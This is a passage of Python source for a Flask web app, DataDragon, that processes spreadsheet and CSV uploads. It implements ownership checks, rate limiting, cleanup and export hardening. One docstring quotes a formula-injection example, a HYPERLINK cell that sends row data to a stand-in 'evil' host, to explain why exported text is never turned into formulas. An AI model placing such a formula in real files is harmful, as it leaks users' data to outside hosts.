from flask import Flask, Request, render_template, request, send_file, jsonify, Response, stream_with_context, after_this_request, session
import pandas as pd
import numpy as np
import os
import zipfile
from werkzeug.exceptions import HTTPException, RequestEntityTooLarge
from werkzeug.datastructures import FileStorage, ImmutableMultiDict, MultiDict
from werkzeug.utils import cached_property, secure_filename
import shutil
from datetime import date, datetime, timedelta, timezone
import inspect
import traceback
import json
from queue import Queue, Empty
import threading
from concurrent.futures import ThreadPoolExecutor
import secrets
import time
from contextlib import contextmanager
import functools
import operator as operator_module
from functools import wraps
from collections import defaultdict
import math
import re
from urllib.parse import urlparse
from itertools import combinations, count as itertools_count

from datadragon_formula import FormulaError, evaluate_formula as safe_evaluate_formula
import datadragon_regex
from datadragon_logging import current_job_id, log
from datadragon_regex import PatternError, PatternTooComplex

# PDF Report Generation
from reportlab.lib import colors
from reportlab.lib.pagesizes import letter
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
from reportlab.lib.enums import TA_CENTER
from xml.sax.saxutils import escape as pdf_text  # reportlab Paragraphs parse <...> as markup: escape file-derived text

class CacheAwareRequest(Request):
    """A request whose ``files`` can also be filled from the owner's cached results.

    A form field ``cache_id`` (or ``cache_id.<field>``, e.g. ``cache_id.left_file``) stands in for an uploaded file:
    the browser sends the id of a result it already has instead of uploading the bytes again. Every route that
    reads ``request.files`` gets this for free. An uploaded file always wins, and an id that is unknown, expired or
    belongs to another browser is simply treated as "no file".
    """

    @cached_property
    def files(self):
        uploaded = super().files
        wanted = {('file' if key == 'cache_id' else key[len('cache_id.'):]): self.form.get(key)
                  for key in self.form if key == 'cache_id' or key.startswith('cache_id.')}
        wanted = {field: cache_id for field, cache_id in wanted.items() if field and field not in uploaded}
        if not wanted:
            return uploaded
        merged = MultiDict(uploaded)
        for field, cache_id in wanted.items():
            info = get_cached_file_by_id(cache_id)
            if info and os.path.isfile(info.get('path', '')):
                merged.add(field, FileStorage(open(info['path'], 'rb'), filename=info['name']))
        return ImmutableMultiDict(merged)


app = Flask(__name__)
from flask.logging import default_handler as _flask_log_handler
app.logger.removeHandler(_flask_log_handler)    # Flask's own handler would print every line a second time
app.request_class = CacheAwareRequest
if os.environ.get('DATADRAGON_TRUST_PROXY', '') == '1':
    # Behind exactly one reverse proxy (Railway, nginx ...): believe its X-Forwarded-For/-Host/-Proto, so the client
    # address used for rate limits and the host used by the same-origin check are the public ones. Never enable this
    # when the app is reachable directly: anyone could then forge those headers.
    from werkzeug.middleware.proxy_fix import ProxyFix
    app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_host=1, x_proto=1)
_configured_secret = os.environ.get('DATADRAGON_SECRET_KEY')
app.config['SECRET_KEY'] = _configured_secret or secrets.token_hex(32)
if not _configured_secret:
    app.logger.warning('DATADRAGON_SECRET_KEY is not set: using a random key, browser sessions reset on restart.')
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=1)
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = os.environ.get('DATADRAGON_HTTPS', '') == '1'


# Hosts (as browsers write them, e.g. app.example.com) that may post to this app even when a proxy rewrites the Host
# header. Comma-separated; empty by default.
ALLOWED_ORIGIN_HOSTS = {h.strip() for h in os.environ.get('DATADRAGON_ALLOWED_ORIGINS', '').split(',') if h.strip()}


@app.before_request
def reject_cross_origin_writes():
    """Block state-changing requests that a browser sends from another site (drive-by / CSRF).

    Browsers attach Origin (or at least Referer) to cross-site POSTs. Requests with neither header
    (curl, scripts, tests) are not browser-driven cross-site requests and are allowed.
    """
    if request.method in ('GET', 'HEAD', 'OPTIONS'):
        return None
    source = request.headers.get('Origin') or request.headers.get('Referer')
    if not source:
        return None
    source_host = urlparse(source).netloc if source != 'null' else 'null'
    if source_host != request.host and source_host not in ALLOWED_ORIGIN_HOSTS:
        return jsonify({'error': 'Cross-origin request blocked'}), 403
    return None

# =============================================================================
# OWNERSHIP - every job, cached file and download belongs to one browser (signed session cookie)
# =============================================================================
class OwnerRegistry:
    """Thread-safe map: key -> (owner, created_at)."""

    def __init__(self):
        self._items = {}
        self._lock = threading.Lock()

    def bind(self, key, owner):
        with self._lock:
            self._items[key] = (owner, time.time())

    def owner_of(self, key):
        with self._lock:
            item = self._items.get(key)
        return item[0] if item else None

    def expire(self, ttl_seconds):
        cutoff = time.time() - ttl_seconds
        with self._lock:
            for key in [k for k, (_, created) in self._items.items() if created < cutoff]:
                del self._items[key]


job_registry = OwnerRegistry()    # progress/session ids -> owner
OWNER_TTL_SECONDS = 2 * 3600


def current_owner():
    """Opaque id of this browser, kept in the signed session cookie."""
    owner = session.get('owner')
    if not owner:
        owner = secrets.token_urlsafe(16)
        session['owner'] = owner
    return owner


@app.before_request
def assign_owner():
    current_owner()


cancelled_jobs = set()


class JobCancelled(Exception):
    """Raised inside a running job (at its next progress report) after the owner cancelled it."""


def register_job(session_id, progress_queue, owner=None):
    """Create the progress channel for a job and bind it to its owner."""
    progress_queues[session_id] = progress_queue
    progress_queue_created[session_id] = time.time()
    cancelled_jobs.discard(session_id)           # a pipeline session starts several jobs under one id
    original_put = progress_queue.put

    def put_and_touch(item, *args, **kwargs):
        progress_queue_created[session_id] = time.time()    # the job is alive: the channel is not abandoned
        terminal = isinstance(item, dict) and item.get('stage') in ('done', 'error')
        if session_id in cancelled_jobs and not terminal:
            raise JobCancelled('Cancelled')                   # a long loop reports progress: stop it here
        return original_put(item, *args, **kwargs)
    progress_queue.put = put_and_touch
    job_registry.bind(session_id, owner or current_owner())


def job_dir(job_id, create=True):
    """Output directory of one job: output/<job_id>/ (job ids are random, so jobs can never collide)."""
    path = os.path.join(app.config['OUTPUT_FOLDER'], job_id)
    if create:
        os.makedirs(path, exist_ok=True)
    return path


def job_output_path(job_id, filename):
    return os.path.join(job_dir(job_id), filename)


def job_download_url(job_id, filename):
    return f'/download/{job_id}/{filename}'


def cleanup_owner_registries():
    job_registry.expire(OWNER_TTL_SECONDS)


# =============================================================================
# RETENTION & CONCURRENCY (see README / security page)
# =============================================================================
def _minutes(name, default):
    try:
        return float(os.environ.get(name, default)) * 60
    except ValueError:
        return default * 60


OUTPUT_TTL_SECONDS = _minutes('DATADRAGON_OUTPUT_TTL_MIN', 30)   # result files are deleted this long after their job
UPLOAD_TTL_SECONDS = _minutes('DATADRAGON_UPLOAD_TTL_MIN', 30)   # stray uploads (failed/abandoned requests)
QUEUE_TTL_SECONDS = 10 * 60                                      # progress channels nobody collected
PIPELINE_IDLE_SECONDS = 2 * 3600                                 # pipeline sessions expire on last activity
MAX_PIPELINES_PER_OWNER = 3
MAX_PIPELINES_TOTAL = 20
CLEANUP_INTERVAL_SECONDS = 300
MAX_JOBS = max(1, int(os.environ.get('DATADRAGON_MAX_JOBS', 4)))

# Every background job runs in this bounded pool (a flood of uploads queues up instead of spawning a thread each)
executor = ThreadPoolExecutor(max_workers=MAX_JOBS, thread_name_prefix='job')


def _log_job_failure(future):
    error = future.exception()
    if error is not None:   # jobs report their own errors to the user; this only catches what escaped them
        log.error("background job crashed: %r", error)


# ------------------------------------------------------------------ logging and error hygiene
class UserError(ValueError):
    """A problem with the user's input, worded for the user. Only these messages (and FormulaError / PatternError)
    are sent to the browser; any other exception is logged and the browser gets a generic message with a reference."""


def user_message(error, ref):
    """What the browser may be told about ``error``. Unexpected errors are logged in full under ``ref`` only."""
    if isinstance(error, (UserError, FormulaError, PatternError, PatternTooComplex)):
        return str(error)
    log.error('unexpected error (ref %s): %s: %s\n%s', ref, type(error).__name__, error,
              ''.join(traceback.format_exception(type(error), error, error.__traceback__)))
    return f'Processing failed (ref {ref})'


def progress_sender(progress_queue, session_id):
    """The standard `send_progress(stage, current, total, message, percentage=None)` callable of a job."""
    def send_progress(stage, current, total, message, percentage=None):
        if not (progress_queue and session_id):
            return
        progress_queue.put({
            'stage': stage,
            'current': current,
            'total': total,
            'percentage': percentage if percentage is not None else (int((current / total) * 100) if total > 0 else 0),
            'message': message,
        })
    return send_progress


def job_worker(*input_files, discard_job_dir=False):
    """Decorator for background job functions taking `progress_queue` and `session_id` arguments.

    A failure is turned into an error message on the progress queue (user-worded for UserError, generic with a
    reference otherwise), the named input-file arguments are deleted, and everything logged inside carries the job id.
    """
    def decorate(function):
        signature = inspect.signature(function)

        @wraps(function)
        def run(*args, **kwargs):
            bound = signature.bind(*args, **kwargs)
            bound.apply_defaults()
            queue, job_id = bound.arguments['progress_queue'], bound.arguments['session_id']
            token = current_job_id.set(job_id or '-')
            try:
                return function(*args, **kwargs)
            except Exception as error:      # JobCancelled is an Exception too: it ends the job with its message
                message = 'Cancelled' if isinstance(error, JobCancelled) else user_message(error, job_id)
                for name in input_files:
                    discard_upload(bound.arguments.get(name))
                if discard_job_dir:
                    shutil.rmtree(job_dir(job_id, create=False), ignore_errors=True)   # a failed job keeps nothing
                queue.put({'stage': 'error', 'message': message})
            finally:
                current_job_id.reset(token)
        return run
    return decorate


@contextmanager
def temporary_upload(file, prefix='temp'):
    """Save an upload just long enough to read it; the file is removed afterwards, whatever happens."""
    path = os.path.join(app.config['UPLOAD_FOLDER'],
                        f"{prefix}_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{secrets.token_hex(8)}_{secure_filename(file.filename)}")
    file.save(path)
    try:
        yield path
    finally:
        discard_upload(path)


def check_upload(field, allowed, bad_type_message):
    """The uploaded file in form field ``field``, or a UserError (400) if it is missing or the wrong type."""
    if field not in request.files:
        raise UserError('No file uploaded')
    file = request.files[field]
    if file.filename == '':
        raise UserError('No file selected')
    if not file.filename.lower().endswith(allowed):
        raise UserError(bad_type_message)
    return file


def store_upload(file, prefix):
    """Save an upload under a new random job id. Returns (job_id, path, safe_filename)."""
    filename = secure_filename(file.filename)
    job_id = f"{prefix}_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{secrets.token_hex(8)}"
    path = os.path.join(app.config['UPLOAD_FOLDER'], f"{job_id}_{filename}")
    save_upload(file, path, job_id)
    return job_id, path, filename


def open_job(job_id):
    """Create and register the progress channel of a new job."""
    progress_queue = Queue()
    register_job(job_id, progress_queue)
    return progress_queue


def job_started(job_id):
    """The JSON answer of a route that started a background job: the browser then follows /progress/<id>."""
    return jsonify({'success': True, 'session_id': job_id})


def guarded_job(progress_queue, job_id):
    """Decorator for a job function defined inside a route: like job_worker, but for a closure without arguments."""
    def decorate(function):
        @wraps(function)
        def run():
            token = current_job_id.set(job_id)
            try:
                return function()
            except Exception as error:
                message = 'Cancelled' if isinstance(error, JobCancelled) else user_message(error, job_id)
                progress_queue.put({'stage': 'error', 'message': message})
            finally:
                current_job_id.reset(token)
        return run
    return decorate


def api_errors(view):
    """Decorator for JSON routes: input problems come back as 400/422 with their own message; anything unexpected is
    logged with a reference and the browser gets 'Processing failed (ref ...)'."""
    @wraps(view)
    def wrapped(*args, **kwargs):
        try:
            return view(*args, **kwargs)
        except HTTPException:
            raise                                       # 413, 400 ... from werkzeug keep their own meaning
        except PatternTooComplex as error:
            return jsonify({'error': str(error)}), 422
        except (UserError, FormulaError, PatternError) as error:
            return jsonify({'error': str(error)}), 400
        except Exception as error:
            return jsonify({'error': user_message(error, secrets.token_hex(4))}), 500
    return wrapped


def start_job(function, *args):
    """Run `function(*args)` in the job pool."""
    future = executor.submit(function, *args)
    future.add_done_callback(_log_job_failure)
    return future


def discard_upload(path):
    """Delete an uploaded file as soon as its contents are loaded."""
    try:
        if path:
            os.remove(path)
    except OSError:
        pass


# Store progress queues for active sessions
progress_queues = {}
progress_queue_created = {}   # session_id -> created timestamp, so uncollected queues can expire

# Store analysis results temporarily (session_id -> {'data': analysis_data, 'timestamp': time.time()})
# These are cleaned up after being fetched or after 1 hour
analysis_results = {}

# Rate limiting: track requests per IP
rate_limit_store = defaultdict(list)
RATE_LIMIT_REQUESTS = 10  # Max requests
RATE_LIMIT_WINDOW = 60  # Per 60 seconds

# Use absolute paths for upload and output folders
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.environ.get('DATADRAGON_DATA_DIR', BASE_DIR)
app.config['UPLOAD_FOLDER'] = os.path.join(DATA_DIR, 'uploads')
app.config['OUTPUT_FOLDER'] = os.path.join(DATA_DIR, 'output')
app.config['MAX_CONTENT_LENGTH'] = 500 * 1024 * 1024  # 500MB max file size

# Ensure folders exist
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
os.makedirs(app.config['OUTPUT_FOLDER'], exist_ok=True)

# Rate limiting decorator
def rate_limit(max_requests=10, window=60):
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            bucket_key = (request.remote_addr, request.endpoint)   # each route has its own allowance per client
            now = time.time()
            recent = [t for t in rate_limit_store.get(bucket_key, ()) if now - t < window]
            if len(recent) >= max_requests:
                rate_limit_store[bucket_key] = recent
                return jsonify({'error': 'Rate limit exceeded. Please try again later.'}), 429
            recent.append(now)
            rate_limit_store[bucket_key] = recent
            return f(*args, **kwargs)
        return decorated_function
    return decorator

def cleanup_rate_limits(now=None):
    """Forget buckets with no request inside the window, so the table does not grow with every client ever seen."""
    now = now or time.time()
    for key, times in list(rate_limit_store.items()):
        if not times or now - times[-1] > RATE_LIMIT_WINDOW:
            rate_limit_store.pop(key, None)


# Cleanup old analysis results periodically
def cleanup_old_analysis_results():
    """Remove analysis results older than 1 hour"""
    current_time = time.time()
    for session_id, data in list(analysis_results.items()):
        if current_time - data.get('timestamp', 0) > 3600:
            analysis_results.pop(session_id, None)
            log.info(f"Cleaned up expired analysis session: {session_id}")


def _tree_mtime(path):
    """Newest modification time in a file or directory tree."""
    newest = os.path.getmtime(path)
    if os.path.isdir(path):
        for entry in os.scandir(path):
            try:
                newest = max(newest, entry.stat().st_mtime)
            except OSError:
                pass
    return newest


def cleanup_outputs(now=None):
    """Delete job output folders (and stray files) older than the output TTL, downloaded or not."""
    now = now or time.time()
    root = app.config['OUTPUT_FOLDER']
    for name in os.listdir(root):
        path = os.path.join(root, name)
        try:
            if now - _tree_mtime(path) > OUTPUT_TTL_SECONDS:
                shutil.rmtree(path, ignore_errors=True) if os.path.isdir(path) else os.remove(path)
        except OSError:
            pass


def cleanup_uploads(now=None):
    """Delete uploads that no job removed (failed or abandoned requests)."""
    now = now or time.time()
    root = app.config['UPLOAD_FOLDER']
    for name in os.listdir(root):
        path = os.path.join(root, name)
        try:
            if os.path.isfile(path) and now - os.path.getmtime(path) > UPLOAD_TTL_SECONDS:
                os.remove(path)
        except OSError:
            pass


def cleanup_progress_queues(now=None):
    """Drop progress channels that were never collected."""
    now = now or time.time()
    for session_id, created in list(progress_queue_created.items()):
        if now - created > QUEUE_TTL_SECONDS:
            progress_queue_created.pop(session_id, None)
            progress_queues.pop(session_id, None)
            cancelled_jobs.discard(session_id)


def run_cleanup():
    """One sweep. Each step is isolated: a failure in one must not stop the others or kill the sweeper."""
    for step in (cleanup_old_analysis_results, cleanup_session_cache, cleanup_pipeline_sessions,
                 cleanup_owner_registries, cleanup_outputs, cleanup_uploads, cleanup_progress_queues,
                 cleanup_rate_limits):
        try:
            step()
        except Exception:
            app.logger.exception('Cleanup step %s failed', step.__name__)


# Start cleanup thread
def cleanup_thread():
    while True:
        time.sleep(CLEANUP_INTERVAL_SECONDS)
        run_cleanup()

cleanup_thread_instance = threading.Thread(target=cleanup_thread, daemon=True)
cleanup_thread_instance.start()

# =============================================================================
# SESSION FILE CACHING - Store processed results for tool chaining
# =============================================================================
# Global file cache with unique IDs - accessible across all sessions
file_cache = {}  # cache_id -> {'name': str, 'path': str, 'timestamp': float, 'rows': int, 'cols': int, 'source_tool': str}

def cache_session_file(session_id, filename, file_path, rows, cols, source_tool='Unknown', owner=None):
    """Cache a processed file for potential use in another tool. Returns cache_id."""
    import hashlib
    # Generate unique cache ID from filename + timestamp
    cache_id = hashlib.md5(f"{filename}{time.time()}{os.urandom(8).hex()}".encode()).hexdigest()[:12]

    owner = owner or current_owner()

    # Keep only the 10 most recent files per owner
    owned_ids = [k for k, v in file_cache.items() if v.get('owner') == owner]
    if len(owned_ids) >= 10:
        # Remove this owner's oldest file
        oldest_id = min(owned_ids, key=lambda k: file_cache[k]['timestamp'])
        file_cache.pop(oldest_id)   # only the cache entry: the result stays downloadable until the retention sweep

    file_cache[cache_id] = {
        'name': filename,
        'path': file_path,
        'timestamp': time.time(),
        'rows': rows,
        'cols': cols,
        'source_tool': source_tool,
        'owner': owner
    }
    return cache_id

def get_cached_files(session_id=None):
    """Get the current browser's cached files (session_id kept for backwards compatibility)"""
    owner = current_owner()
    return [v for v in file_cache.values() if v.get('owner') == owner]

def get_cached_file_by_id(cache_id):
    """Get a cached file by its cache ID, but only if it belongs to the current browser"""
    info = file_cache.get(cache_id)
    if info is None or info.get('owner') != current_owner():
        return None
    return info

def cleanup_session_cache():
    """Remove cached files older than the output TTL"""
    current_time = time.time()
    for cache_id, data in list(file_cache.items()):
        if current_time - data.get('timestamp', 0) > OUTPUT_TTL_SECONDS:
            file_info = file_cache.pop(cache_id, {})
            try:
                if os.path.exists(file_info.get('path', '')):
                    os.remove(file_info['path'])
            except OSError:
                pass
            log.info(f"Cleaned up expired cache: {cache_id}")

# =============================================================================
# DATA READINESS PIPELINE - Guided multi-stage data assessment workflow
# =============================================================================
class PipelineState:
    """Stores state for a Data Readiness Pipeline session"""
    def __init__(self, session_id, file_path, filename, owner=None):
        self.session_id = session_id
        self.owner = owner
        self.file_path = file_path
        self.filename = filename
        self.created_at = time.time()
        self.last_activity = self.created_at
        self.current_stage = 1
        self.generation = 0   # bumped whenever stages are invalidated; a running job from an older generation must not store results
        self.df = None  # DataFrame loaded in memory during session
        self.row_count = 0
        self.col_count = 0

        # Stage data storage
        self.stage_data = {
            1: None,  # Shape Analysis results
            2: None,  # Gap Assessment + user triage decisions
            3: None,  # Natural Key results + user selection
            4: None,  # Transformation recommendations + user selections
            5: None   # Execution results + transformation log
        }

        # User decisions at each stage
        self.user_decisions = {
            2: {},  # gap_triage: {column_name: 'acceptable' | 'needs_attention'}
            3: {},  # selected_keys: [list of columns]
            4: {}   # selected_transformations: {type: config}
        }

    def to_dict(self):
        """Return serializable state summary"""
        return {
            'session_id': self.session_id,
            'filename': self.filename,
            'created_at': self.created_at,
            'current_stage': self.current_stage,
            'row_count': self.row_count,
            'col_count': self.col_count,
            'stages_completed': [k for k, v in self.stage_data.items() if v is not None]
        }

# Pipeline session storage
pipeline_sessions = {}  # session_id -> PipelineState

def evict_pipeline_session(session_id):
    """Forget a pipeline session: free its DataFrame and delete its uploaded file."""
    state = pipeline_sessions.pop(session_id, None)
    if state is None:
        return
    discard_upload(state.file_path)
    state.df = None
    log.info(f"Removed pipeline session: {session_id}")


def make_room_for_pipeline(owner):
    """Least-recently-used eviction so one browser (or all of them) cannot hold unbounded DataFrames."""
    def least_recent(candidates):
        return min(candidates, key=lambda sid: pipeline_sessions[sid].last_activity)

    while True:
        mine = [sid for sid, st in list(pipeline_sessions.items()) if st.owner == owner]
        if len(mine) >= MAX_PIPELINES_PER_OWNER:
            evict_pipeline_session(least_recent(mine))
        elif len(pipeline_sessions) >= MAX_PIPELINES_TOTAL:
            evict_pipeline_session(least_recent(list(pipeline_sessions)))
        else:
            return


def invalidate_pipeline_stages(state, from_stage):
    """Re-running a stage makes everything computed or decided after it stale: forget it."""
    state.generation += 1
    for stage in range(from_stage, 6):
        state.stage_data[stage] = None
        if stage in state.user_decisions:
            state.user_decisions[stage] = {}
    state.current_stage = min(state.current_stage, max(from_stage - 1, 1))


def owned_pipeline_state(session_id):
    """The pipeline session, but only for the browser that started it. Using it counts as activity."""
    state = pipeline_sessions.get(session_id)
    if state is None or state.owner != current_owner():
        return None
    state.last_activity = time.time()
    return state


def cleanup_pipeline_sessions():
    """Remove pipeline sessions idle for more than two hours"""
    current_time = time.time()
    for session_id, state in list(pipeline_sessions.items()):
        if current_time - state.last_activity > PIPELINE_IDLE_SECONDS:
            evict_pipeline_session(session_id)

# =============================================================================
# UNIFIED FILE READER - Handles Excel and CSV with automatic detection
# =============================================================================
ALLOWED_EXTENSIONS = {'xlsx', 'xls', 'csv'}
ALLOWED_MIME_TYPES = {
    'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',  # xlsx
    'application/vnd.ms-excel',  # xls
    'text/csv',
    'application/csv',
    'text/plain'  # Some systems send CSV as text/plain
}

def allowed_file(filename):
    """Check if file extension is allowed"""
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def get_file_extension(filename):
    """Get lowercase file extension"""
    return filename.rsplit('.', 1)[1].lower() if '.' in filename else ''

def read_data_file(file_path, mode='lossless', sheet_name=0, **kwargs):
    """
    Unified file reader for Excel (.xlsx, .xls) and CSV files.

    mode='lossless' (default): cell values are kept exactly as stored. CSV cells stay text, Excel text
        cells stay text (so '00123' keeps its zeros), numbers/dates/booleans keep their Python type and
        blanks are NaN. Use this for every tool that passes data through or matches keys.
    mode='infer': pandas' own type inference (numbers as int64/float64, dates...). Use where arithmetic or
        statistics are needed (see inferred_copy() for doing this on an already-loaded frame).

    Only the first sheet of a workbook is read unless sheet_name says otherwise.
    Extra keyword arguments (nrows, usecols, ...) are passed to pandas.
    """
    ext = get_file_extension(file_path)

    if ext == 'csv':
        options = dict(kwargs)
        if mode == 'lossless':
            options.setdefault('dtype', str)
            options.setdefault('keep_default_na', False)
            options.setdefault('na_values', [''])
        # utf-8-sig also strips a byte-order mark; cp1252 covers Windows exports; latin-1 never fails.
        # Only a decoding failure moves on to the next encoding; any other error is real and propagates.
        for encoding in ('utf-8-sig', 'cp1252', 'latin-1'):
            try:
                return pd.read_csv(file_path, encoding=encoding, **options)
            except UnicodeDecodeError:
                continue
        raise UserError("Could not read CSV file with any supported encoding")

    elif ext in ('xlsx', 'xls'):
        options = dict(kwargs)
        if mode == 'lossless':
            options.setdefault('dtype', object)
        return pd.read_excel(file_path, sheet_name=sheet_name, **options)

    else:
        raise UserError(f"Unsupported file format: {ext}. Supported formats: xlsx, xls, csv")


def inferred_copy(df):
    """Type-inferred copy of a lossless frame, for arithmetic/statistics. The original is not changed.

    A column becomes numeric only if every non-blank value parses as a number (pandas' own rule);
    object columns of dates/bools are re-typed by infer_objects().
    """
    out = df.copy()
    for col in out.columns:
        if out[col].dtype == object:
            numeric = pd.to_numeric(out[col], errors='coerce')
            if numeric.notna().sum() == out[col].notna().sum():
                out[col] = numeric
    return out.infer_objects()


def _canonical_key_text(value):
    if isinstance(value, float) and value.is_integer():
        return str(int(value))
    return str(value)


def align_key_types(df_a, cols_a, df_b, cols_b):
    """Make key columns comparable when one file stores a key as a number and the other as text
    (e.g. Excel 123 vs CSV '123'): the numeric side is converted to text. Frames are changed in place."""
    def kind(series):
        kinds = set()
        for v in series.dropna():
            if isinstance(v, (bool, np.bool_)):
                kinds.add('other')
            elif isinstance(v, (int, float, np.integer, np.floating)):
                kinds.add('num')
            elif isinstance(v, str):
                kinds.add('str')
            else:
                kinds.add('other')
        return kinds.pop() if len(kinds) == 1 else None

    for col_a, col_b in zip(cols_a, cols_b):
        if col_a not in df_a.columns or col_b not in df_b.columns:
            continue
        kind_a, kind_b = kind(df_a[col_a]), kind(df_b[col_b])
        if {kind_a, kind_b} == {'num', 'str'}:
            numeric_df, numeric_col = (df_a, col_a) if kind_a == 'num' else (df_b, col_b)
            numeric_df[numeric_col] = numeric_df[numeric_col].map(
                lambda v: v if pd.isna(v) else _canonical_key_text(v))


def sheet_names_of(file_path):
    """Sheet names of an Excel workbook ([] for CSV or on any read problem)."""
    if get_file_extension(file_path) not in ('xlsx', 'xls'):
        return []
    try:
        with pd.ExcelFile(file_path) as workbook:
            return [name for name in workbook.sheet_names if name != LOG_SHEET]   # our own log sheet is not user data
    except Exception:
        return []


# job_id -> {'sheet_names': [...], 'warning': str}; added to the job's final message
job_notes = {}
MAX_JOB_NOTES = 500


def add_job_notes(message, job_id):
    """Add the job's multi-sheet warning (if any) to a message dict and return it."""
    note = job_notes.get(job_id)
    if note:
        message['sheet_names'] = note['sheet_names']
        message['warning'] = (message.get('warning', '') + ' ' + note['warning']).strip()
        if note.get('log_url'):
            message['log_url'] = note['log_url']
    return message


def save_upload(file_storage, path, job_id):
    """Save an uploaded file; remember a warning if it is a workbook with several sheets."""
    file_storage.save(path)
    names = sheet_names_of(path)
    if len(names) > 1:
        while len(job_notes) >= MAX_JOB_NOTES:
            job_notes.pop(next(iter(job_notes)))  # drop the oldest
        note = job_notes.setdefault(job_id, {'sheet_names': [], 'warning': ''})
        note['sheet_names'] = names
        display = os.path.basename(path)
        if display.startswith(job_id + '_'):
            display = display[len(job_id) + 1:]
        display = re.sub(r'^(left|right|file1|file2)_', '', display)
        text = (f"{display} has {len(names)} sheets ({', '.join(names)}); "
                f"only the first sheet, '{names[0]}', was processed.")
        note['warning'] = (note['warning'] + ' ' + text).strip()


def excel_writer(path):
    """ExcelWriter for output files. xlsxwriter, with text that merely LOOKS like a formula or a link written as
    plain text: a cell such as =HYPERLINK("http://evil/?"&A2,"x") from an uploaded file must stay text in what we
    export, never become a live formula (formula injection)."""
    return pd.ExcelWriter(path, engine='xlsxwriter',
                          engine_kwargs={'options': {'strings_to_formulas': False, 'strings_to_urls': False}})


EXCEL_MAX_ROWS = 1048576
EXCEL_MAX_COLUMNS = 16384
PIVOT_SOURCE_SHEET_LIMIT = 100000   # the pivot workbook repeats the source rows; skip that copy for big files


LOG_SHEET = '_DataDragon_Log'
APP_VERSION = '4.0.0'
_SECRET_PARAM = re.compile(r'pass(word)?|secret|token|api[_-]?key|credential', re.I)


def _git_commit():
    """Short commit id of the running code, or 'unknown' (a deployment without .git can set DATADRAGON_COMMIT)."""
    if os.environ.get('DATADRAGON_COMMIT'):
        return os.environ['DATADRAGON_COMMIT'][:12]
    try:
        import subprocess
        out = subprocess.run(['git', 'rev-parse', '--short', 'HEAD'], cwd=os.path.dirname(os.path.abspath(__file__)),
                             capture_output=True, text=True, timeout=3)
        return out.stdout.strip() or 'unknown'
    except Exception:
        return 'unknown'


APP_COMMIT = _git_commit()


def make_log(tool, rows_in=None, rows_out=None, params=None, job_id=None):
    """The record embedded in every output: what ran, with which code, when, with which settings, what went in and out.
    Callers pass the structure of the request (columns, operators, flags, counts), not literal search texts, filter
    values or rule values, which are often the very data being redacted. Parameters named like secrets are dropped."""
    def clean(value):
        if isinstance(value, dict):
            return {str(k): clean(v) for k, v in value.items() if not _SECRET_PARAM.search(str(k))}
        if isinstance(value, (list, tuple, set)):
            return [clean(v) for v in value]
        return make_json_serializable(value)
    notes = job_notes.get(job_id) if job_id else None
    return {
        'Tool': tool,
        'Version': f'DataDragon {APP_VERSION} ({APP_COMMIT})',
        'Timestamp (UTC)': datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S'),
        'Rows in': None if rows_in is None else int(rows_in),
        'Rows out': None if rows_out is None else int(rows_out),
        'Parameters': json.dumps(clean(params or {}), ensure_ascii=False, sort_keys=True),
        'Warnings': (notes or {}).get('warning', ''),
    }


def log_frame(log):
    return pd.DataFrame({'Item': list(log), 'Value': ['' if v is None else str(v) for v in log.values()]})


def log_as_json(log):
    return json.dumps(log, ensure_ascii=False, indent=2)


def write_log_sheet(workbook, log):
    """Add the `_DataDragon_Log` sheet (Item / Value) to an xlsxwriter workbook."""
    sheet = workbook.add_worksheet(LOG_SHEET)
    header = workbook.add_format({'bold': True, 'border': 1, 'align': 'center', 'valign': 'top'})
    sheet.write_row(0, 0, ['Item', 'Value'], header)
    for row_number, (item, value) in enumerate(log.items(), 1):
        sheet.write_string(row_number, 0, item)
        sheet.write_string(row_number, 1, '' if value is None else str(value))
    sheet.set_column(0, 0, 18)
    sheet.set_column(1, 1, 80)


def write_excel(df, path, sheet_name='Sheet1', log=None, **kwargs):
    """Write one DataFrame to a single-sheet xlsx. Same cell types, blanks and header style as pandas' own writer,
    but written straight through xlsxwriter (about 40% faster on large frames), with formula-like text kept as text."""
    kwargs.setdefault('index', False)
    if kwargs != {'index': False}:
        with excel_writer(path) as writer:      # unusual options: let pandas handle them
            df.to_excel(writer, sheet_name=sheet_name, **kwargs)
            if log:
                log_frame(log).to_excel(writer, sheet_name=LOG_SHEET, index=False)
        return
    if len(df) + 1 > EXCEL_MAX_ROWS or len(df.columns) > EXCEL_MAX_COLUMNS:
        raise UserError(f"This sheet is too large for Excel ({len(df):,} rows x {len(df.columns):,} columns; the "
                         f"limit is {EXCEL_MAX_ROWS:,} rows x {EXCEL_MAX_COLUMNS:,} columns).")
    import xlsxwriter
    workbook = xlsxwriter.Workbook(path, {'strings_to_formulas': False, 'strings_to_urls': False,
                                          'default_date_format': 'yyyy-mm-dd hh:mm:ss'})
    try:
        sheet = workbook.add_worksheet(sheet_name)
        header = workbook.add_format({'bold': True, 'border': 1, 'align': 'center', 'valign': 'top'})
        sheet.write_row(0, 0, [str(c) for c in df.columns], header)
        # blanks (NaN/None/NaT) become None = no cell; infinities were written as the text 'inf' by pandas
        cells = df.astype(object).where(df.notna(), None)
        for row_number, row in enumerate(cells.itertuples(index=False, name=None), 1):
            sheet.write_row(row_number, 0, [('inf' if v == float('inf') else '-inf' if v == float('-inf') else v)
                                            if isinstance(v, float) else v for v in row])
        if log:
            write_log_sheet(workbook, log)
    finally:
        workbook.close()


_FORMULA_START = re.compile(r'^[=+\-@\t\r]')


def sanitize_csv(df):
    """Copy of df for CSV export where text starting with = + - @ (or a tab/CR) gets a leading apostrophe so a
    spreadsheet opening the CSV cannot run it as a formula. Numbers, including negatives, are left alone."""
    def neutralise(value):
        if isinstance(value, str) and _FORMULA_START.match(value):
